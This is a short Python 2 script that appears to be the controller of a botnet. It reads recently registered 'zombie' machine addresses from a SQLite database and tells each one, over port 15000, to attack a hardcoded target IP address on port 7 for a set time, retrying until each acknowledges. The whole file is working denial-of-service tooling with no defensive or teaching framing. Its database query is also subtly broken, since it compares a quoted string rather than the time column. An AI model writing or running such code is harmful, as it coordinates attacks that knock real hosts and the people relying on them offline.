import socket
import time
import sys
import sqlite3 as lite

# Each zombie registers its address and an open port to send attack to
PORT = 15000
TIMEOUT = 30
TARGET = "108.179.185.41"
TARGET_PORT = 7

con = lite.connect('addresses.db')
with con:    
    cur = con.cursor()
    low_time = time.time() - 600
    cur.execute("SELECT DISTINCT ip from addresses where 'time' > {0}".format(low_time))
    zombies = cur.fetchall()
    for zombie in zombies:
        zombie = zombie[0]
        i = 0
        while i < 10:
            i = i + 1
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                data = "{0} {1} {2}".format(TIMEOUT, TARGET, TARGET_PORT)
                sock.connect((zombie, PORT))
                sock.sendall(data + "\n")
                rec = sock.recv(1024)
                if rec == "ACK":
                    sock.close()
                    print "Zombie: {0} initiated".format(zombie)
                    break
            except:
                print sys.exc_info()[0]
                time.sleep(3)
